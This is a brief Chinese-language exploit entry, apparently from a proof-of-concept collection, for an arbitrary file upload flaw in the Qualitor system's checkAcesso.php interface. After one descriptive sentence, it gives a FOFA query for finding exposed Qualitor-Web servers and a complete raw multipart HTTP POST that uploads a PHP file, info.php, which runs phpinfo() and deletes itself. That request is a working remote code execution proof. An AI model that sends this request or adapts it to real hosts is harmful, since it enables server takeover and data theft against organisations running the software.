# Qualitor系统接口checkAcesso.php任意文件上传漏洞

Qualitor系统接口checkAcesso.php任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
app="Qualitor-Web"
```

## poc

```javascript
POST /html/ad/adfilestorage/request/checkAcesso.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=---------------------------QUALITORspaceCVEspace2024space44849

-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="idtipo"

2
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmfilestorage"


-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmdiretoriorede"

.
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmbucket"


-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmaccesskey"


-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmkeyid"


-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="fleArquivo"; filename="info.php"

<?php phpinfo();unlink(__FILE__);?>
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="cdfilestorage"


-----------------------------QUALITORspaceCVEspace2024space44849--
```

![image-20241012131131290](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121311364.png)